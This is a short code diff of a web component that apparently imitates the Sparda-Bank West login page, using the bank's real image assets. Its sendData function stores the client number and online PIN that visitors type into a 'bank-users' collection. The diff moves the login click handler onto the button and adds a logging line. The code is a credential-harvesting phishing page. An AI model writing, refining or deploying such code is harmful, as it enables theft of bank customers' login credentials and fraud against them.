@@ -16,8 +16,8 @@
             <img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
     </div>
-    <button id="loginBtn" ref="loginBtn">
-        <img title="Jetzt einloggen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png" @click="sendData">
+    <button @click="sendData" id="loginBtn" ref="loginBtn">
+        <img title="Jetzt einloggen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png">
     </button>
 
     <InWork />
@@ -90,6 +90,7 @@
     const loginBtn: Ref = ref({ value: null });
     
     async function sendData(){
+        console.log('send data...');
         await useAsyncData('bank-users', () => create('bank-users', {
             clientNumber: inputUser.value.value,
             onlinePin: inputPin.value.value
